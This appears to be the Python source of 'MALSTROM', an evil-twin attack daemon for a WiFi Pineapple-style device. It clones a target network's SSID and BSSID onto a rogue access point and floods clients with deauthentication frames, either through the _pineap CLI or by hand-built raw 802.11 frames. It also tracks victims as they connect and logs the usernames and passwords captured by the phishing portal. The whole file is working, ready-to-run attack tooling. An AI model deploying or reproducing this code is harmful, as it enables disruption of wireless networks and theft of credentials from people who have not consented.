#!/usr/bin/env python3
"""
DarkSec MALSTROM — attack engine.

A background daemon that drives the evil-twin kill chain while the operator
controls it from the web dashboard:

  watch /tmp/malstrom/state   JSON: target, portal mode, deauth config, active
  clone                        apply target SSID/BSSID to Open AP / Evil WPA
  deauth                       broadcast / targeted / adaptive bursts
  monitor                      clients (ip neigh + dhcp.leases), ARP anomalies,
                               whitelist + credential events
  events                       append JSON-lines to /tmp/malstrom/events
                               (consumed by the dashboard's SSE stream)

Deauth is sent through the `_pineap DEAUTH` CLI when available (same command
Tunnel_Rat uses) and falls back to raw 802.11 deauth frame injection over a
monitor interface (wlan1mon / wlan0mon) if the CLI is missing.

Standalone: this daemon talks only to the filesystem — no web, no shell
builtins. payload.sh and cgi-bin/api.sh drive it entirely through the state
file.
"""

import json
import os
import re
import socket
import struct
import subprocess
import sys
import time
import threading

# --- Paths --------------------------------------------------------------------
STATE_DIR = os.environ.get('MALSTROM_STATE_DIR', '/tmp/malstrom')
STATE_FILE = os.path.join(STATE_DIR, 'state')
EVENTS_FILE = os.path.join(STATE_DIR, 'events')
CREDS_FILE = os.path.join(STATE_DIR, 'creds.json')
WHITELIST_FILE = os.path.join(STATE_DIR, 'whitelist.txt')
TEMPLATE_DEFAULT_FILE = os.path.join(STATE_DIR, 'template_default')

DEAUTH_CLIENT_PATH = '/usr/sbin/_pineap'
DEAUTH_CANDIDATES = ('_pineap', '/pineapple/bin/_pineap', '/usr/bin/_pineap')

# --- Defaults -----------------------------------------------------------------
DEFAULT_STATE = {
    'active': False,
    'target_ssid': '',
    'target_bssid': '',
    'target_channel': '6',
    'portal_mode': 'open',          # open | wpa
    'wpa_psk': '',
    'deauth_mode': 'broadcast',     # broadcast | targeted | adaptive
    'deauth_burst': 25,
    'deauth_delay': 1,
    'deauth_continuous': True,
    'template': 'wifi_login',
    'redir_target': 'http://example.com',
    'updated': 0,
}

FLUSH_EVENTS_ON_BOOT = True  # wipe old event log when engine starts


# --- Event emission ------------------------------------------------------------
def emit(etype, msg):
    """Append a JSON event line. type: INFO|ALERT|CLIENT|CLIENT_LEAVE|CRED|DEAUTH|DEP|CLEANUP"""
    line = json.dumps({
        'ts': time.strftime('%Y-%m-%d %H:%M:%S'),
        'type': etype,
        'msg': msg,
    })
    try:
        with open(EVENTS_FILE, 'a') as fh:
            fh.write(line + '\n')
    except IOError:
        pass


def load_state():
    try:
        with open(STATE_FILE) as fh:
            data = json.load(fh)
        merged = dict(DEFAULT_STATE)
        merged.update(data)
        return merged
    except (IOError, ValueError):
        return dict(DEFAULT_STATE)


def write_state(state):
    with open(STATE_FILE, 'w') as fh:
        json.dump(state, fh)


# --- Clients + ARP monitor ------------------------------------------------------
def read_dhcp_leases():
    """Parse /tmp/dhcp.leases -> {ip: {'mac':m,'name':n}}"""
    result = {}
    try:
        with open('/tmp/dhcp.leases') as fh:
            for line in fh:
                parts = line.split()
                if len(parts) >= 4:
                    ts, mac, ip, name = parts[0], parts[1], parts[2], parts[3]
                    result[ip] = {'mac': mac.upper(), 'name': name}
    except IOError:
        pass
    return result


def read_arp_table():
    """Parse /proc/net/arp -> {ip: {'mac':m,'dev':d}} skipping incomplete."""
    result = {}
    try:
        with open('/proc/net/arp') as fh:
            next(fh, None)  # header
            for line in fh:
                parts = line.split()
                if len(parts) >= 4 and parts[3] != '00:00:00_00:00:00' and 'incomplete' not in line.lower():
                    ip, hw, flags, mac = parts[0], parts[1], parts[2], parts[3]
                    if mac != '00:00:00:00:00:00':
                        result[ip] = {'mac': mac.upper(), 'dev': parts[5] if len(parts) > 5 else ''}
    except IOError:
        pass
    return result


def read_whitelist():
    try:
        with open(WHITELIST_FILE) as fh:
            return set(l.strip() for l in fh if l.strip())
    except IOError:
        return set()


def count_creds():
    try:
        with open(CREDS_FILE) as fh:
            return sum(1 for _ in fh)
    except IOError:
        return 0


class Monitor(object):
    """
    Tracks connected clients and ARP entity changes. Emits CLIENT / CLIENT_LEAVE
    events on diff and ALERTs when an IP flips MACs (possible ARP spoof).
    """

    def __init__(self):
        self.clients = {}        # ip -> {'mac','name','first_seen','last_seen'}
        self.arp_map = {}        # ip -> mac (persistent across reads)
        self._arp_warned = set()
        self._client_warned = set()

    def cycle(self):
        now = time.time()
        leases = read_dhcp_leases()
        arp = read_arp_table()

        # Merge: dhcp leases (name known) + arp (mac authoritative)
        merged = {}
        for ip, info in arp.items():
            merged[ip] = {'mac': info['mac'], 'name': leases.get(ip, {}).get('name', '')}
        for ip, info in leases.items():
            if ip not in merged:
                merged[ip] = {'mac': info['mac'], 'name': info['name']}

        # ARP anomaly detection: ip seen with a different mac than before
        for ip, info in arp.items():
            prev = self.arp_map.get(ip)
            if prev and prev != info['mac']:
                key = (ip, info['mac'])
                if key not in self._arp_warned:
                    emit('ALERT', 'ARP entity change: %s now claims MAC %s (was %s)'
                         % (ip, info['mac'], prev))
                    self._arp_warned.add(key)
            self.arp_map[ip] = info['mac']

        # Client diff
        for ip, info in merged.items():
            if ip not in self.clients:
                self.clients[ip] = {
                    'mac': info['mac'],
                    'name': info['name'],
                    'first_seen': now,
                    'last_seen': now,
                }
                emit('CLIENT', '%s (%s) associated' % (info['name'] or ip, info['mac']))
            else:
                self.clients[ip]['last_seen'] = now
                if info['name'] and not self.clients[ip]['name']:
                    self.clients[ip]['name'] = info['name']

        # Leave detection: not seen for > 3 monitor intervals (~12-15s)
        gone = [ip for ip, c in self.clients.items() if now - c['last_seen'] > 15]
        for ip in gone:
            c = self.clients.pop(ip, None)
            if c:
                emit('CLIENT_LEAVE', '%s (%s) disconnected' % (c['name'] or ip, c['mac']))

        return merged


# --- Deauth --------------------------------------------------------------------
class DeauthEngine(object):
    """Sends deauth frames in the configured mode. Driven by a worker thread."""

    def __init__(self):
        self._stop = threading.Event()
        self._thread = None
        self._seq = 0
        self._sock = None
        self._sock_iface = None

    def _monitor_iface(self):
        for name in ('wlan1mon', 'wlan2mon', 'wlan0mon'):
            if os.path.exists('/sys/class/net/' + name):
                return name

        # Any ra0 / wlan that appears to be in monitor mode
        out = subprocess.run(['iwconfig'], capture_output=True, text=True).stdout
        for line in out.splitlines():
            m = re.match(r'^(\S+)\s+.*Mode:Monitor', line)
            if m:
                return m.group(1)
        return None

    def _raw_sock(self):
        iface = self._monitor_iface()
        if not iface:
            return None, None
        if self._sock and self._sock_iface == iface:
            return self._sock, iface
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind((iface, 0))
            self._sock = sock
            self._sock_iface = iface
            return sock, iface
        except OSError:
            return None, None

    def _cli(self):
        for c in DEAUTH_CANDIDATES:
            if os.path.exists(c) or os.path.lexists(c):
                return c
        # check PATH
        for c in ('_pineap',):
            try:
                r = subprocess.run(['which', c], capture_output=True, text=True)
                if r.returncode == 0 and r.stdout.strip():
                    return r.stdout.strip()
            except OSError:
                pass
        return None

    def _send_pineap(self, ap, client, ch):
        cli = self._cli()
        if not cli:
            return False
        try:
            subprocess.run([cli, 'DEAUTH', ap, client, str(ch)],
                           timeout=6, capture_output=True)
            return True
        except (OSError, subprocess.TimeoutExpired):
            return False

    def _send_raw(self, ap, client, ch):
        try:
            sock, iface = self._raw_sock()
            if not sock:
                return False
            self._seq = (self._seq + 1) & 0x0FFF
            fc = struct.pack('<H', 0x00C0)  # deauth, to-DS=0 from-DS=0
            dur = struct.pack('<H', 0x0000)
            dst = bytes.fromhex(client.replace(':', ''))
            src = bytes.fromhex(ap.replace(':', ''))
            seq = struct.pack('<H', self._seq << 4)
            reason = struct.pack('<H', 0x0007)  # reason: class-3 frame from non-associated
            frame = fc + dur + dst + src + src + seq + reason
            sock.send(frame)
            return True
        except (OSError, ValueError):
            return False

    def _send_once(self, ap, client, ch):
        if self._send_pineap(ap, client, ch):
            return 'pineap'
        if self._send_raw(ap, client, ch):
            return 'raw'
        return None

    def _current_clients(self, ap_mac):
        """Query pineapd recon for clients associated to the target AP."""
        out = subprocess.run(['_pineap', 'RECON', 'CLIENTS', 'limit=200', 'format=json'],
                             capture_output=True, text=True, timeout=8).stdout
        macs = []
        try:
            data = json.loads(out)
            for c in data if isinstance(data, list) else data.get('clients', []) if isinstance(data, dict) else []:
                m = c.get('mac') or c.get('client_mac')
                if m and (not ap_mac or (c.get('ap_mac') or '').upper() == ap_mac.upper()):
                    macs.append(m)
        except (ValueError, AttributeError):
            macs = re.findall(r'"mac"\s*:\s*"([0-9A-Fa-f:]+)"', out)
        return macs

    def _burst(self, state):
        ap = state['target_bssid']
        ch = state['target_channel']
        mode = state['deauth_mode']
        count = max(1, int(state.get('deauth_burst', 25) or 25))
        use_pineap = False

        clients = []
        if mode in ('targeted', 'adaptive'):
            clients = self._current_clients(ap)
            use_pineap = True

        if not clients and mode == 'adaptive':
            # targeted nothing yet — ease into broadcast to force clients into recon
            clients = ['FF:FF:FF:FF:FF:FF']

        targets = clients or ['FF:FF:FF:FF:FF:FF']

        method = 'pineap'
        for _ in range(count):
            for client in targets:
                if self._stop.is_set():
                    return
                res = self._send_once(ap, client, ch)
                if res:
                    method = res
        emit('DEAUTH', '%s deauth burst (%d frames) on %s ch%s (%s)'
             % (mode, count * len(targets), ap, ch, method))

    def _worker(self, state):
        while not self._stop.is_set():
            self._burst(state or load_state())
            delay = max(0.2, float(state.get('deauth_delay', 1) or 1))
            self._stop.wait(delay)

    def start(self, state):
        self._stop.clear()
        self._thread = threading.Thread(target=self._worker, args=(state,), daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None


# --- Clone stage ---------------------------------------------------------------
def apply_clone(state, current_state):
    """Set Open AP / Evil WPA to the target identity. Best-effort, returns success bl."""
    if not state['target_ssid']:
        return False
    mode = state.get('portal_mode', 'open')
    iface = 'wlan0open' if mode == 'open' else 'wlan0wpa'
    ok = True
    cmds = [
        ('uci', ['uci', 'set', 'wireless.%s.ssid=%s' % (iface, state['target_ssid'])]),
    ]
    if state['target_bssid']:
        cmds.append(('uci', ['uci', 'set', 'wireless.%s.macaddr=%s' % (iface, state['target_bssid'])]))
    cmds.append(('uci', ['uci', 'set', 'wireless.%s.disabled=0' % iface]))
    if mode == 'wpa' and state.get('wpa_psk'):
        cmds.append(('uci', ['uci', 'set', 'wireless.%s.key=%s' % (iface, state['wpa_psk'])]))
    cmds.append(('uci', ['uci', 'commit', 'wireless']))

    for label, argv in cmds:
        try:
            subprocess.run(argv, timeout=10, capture_output=True)
        except (OSError, subprocess.TimeoutExpired):
            emit('ALERT', 'Clone stage error on: %s' % ' '.join(argv))
            ok = False

    try:
        subprocess.run(['wifi', 'reload'], timeout=15, capture_output=True)
    except OSError:
        try:
            subprocess.run(['/etc/init.d/wifi', 'reload'], timeout=15, capture_output=True)
        except OSError:
            ok = False

    emit('INFO' if ok else 'ALERT',
         'Clone applied: %s (%s) on %s [%s mode]' % (
             state['target_ssid'], state['target_bssid'], iface, mode))
    try:
        with open(os.path.join(STATE_DIR, 'current_ssid'), 'w') as fh:
            fh.write(state['target_ssid'])
    except IOError:
        pass
    return ok


# --- Main loop -------------------------------------------------------------------
def main():
    os.makedirs(STATE_DIR, exist_ok=True)
    if FLUSH_EVENTS_ON_BOOT:
        try:
            open(EVENTS_FILE, 'w').close()
        except IOError:
            pass

    if not os.path.exists(STATE_FILE):
        write_state(DEFAULT_STATE)

    monitor = Monitor()
    deauth = DeauthEngine()
    state = load_state()
    last_state = dict(state)
    last_creds = count_creds()
    last_template = state.get('template', 'wifi_login')

    emit('INFO', 'MALSTROM engine online (pid %d)' % os.getpid())

    poll = max(0.5, float(os.environ.get('MALSTROM_POLL', 2)))

    while True:
        try:
            state = load_state()

            # --- attack transitions ---
            if state.get('active') and not last_state.get('active'):
                apply_clone(state, last_state)
                deauth.start(state)
                emit('DEP', 'Kill chain armed: %s (%s) ch%s [%s deauth]'
                     % (state['target_ssid'] or '?', state['target_bssid'] or '?',
                        state.get('target_channel', '?'), state.get('deauth_mode', '?')))
                if state.get('portal_mode') == 'wpa' and state.get('wpa_psk'):
                    emit('INFO', 'Evil WPA PSK set: %s' % state['wpa_psk'])
            elif not state.get('active') and last_state.get('active'):
                deauth.stop()
                emit('DEP', 'Kill chain disarmed (idle)')

            # --- live parameter updates (no restart) ---
            if state.get('template') != last_template:
                try:
                    with open(TEMPLATE_DEFAULT_FILE, 'w') as fh:
                        fh.write(state['template'] + '\n')
                except IOError:
                    pass
                last_template = state.get('template')
                emit('INFO', 'Portal default template -> %s' % state['template'])

            last_state = dict(state)

            # --- deauth param drift: deauth_mode/burst/delay/target changed ---
            if state.get('active'):
                cfg_armed = (state.get('target_bssid'), state.get('target_channel'),
                             state.get('deauth_mode'), state.get('deauth_burst'),
                             state.get('deauth_delay'), state.get('deauth_continuous'))
                if getattr(deauth, '_cfg', None) != cfg_armed:
                    deauth.stop()
                    deauth._cfg = cfg_armed
                    deauth.start(state)

            # --- monitoring ---
            monitor.cycle()

            # --- credential events ---
            n = count_creds()
            if n > last_creds:
                try:
                    with open(CREDS_FILE) as fh:
                        lines = fh.readlines()
                    for line in lines[last_creds:]:
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            e = json.loads(line)
                            emit('CRED', '%s:%s (%s %s from %s)' % (
                                e.get('username', ''), e.get('password', ''),
                                e.get('device', ''), e.get('hostname', ''),
                                e.get('ip', '?') if e.get('ip') else 'client'))
                        except ValueError:
                            emit('CRED', line)
                except IOError:
                    pass
                last_creds = n

            time.sleep(poll)
        except Exception as exc:  # keep the daemon alive no matter what
            emit('ALERT', 'Engine exception: %s' % exc)
            time.sleep(3)


if __name__ == '__main__':
    main()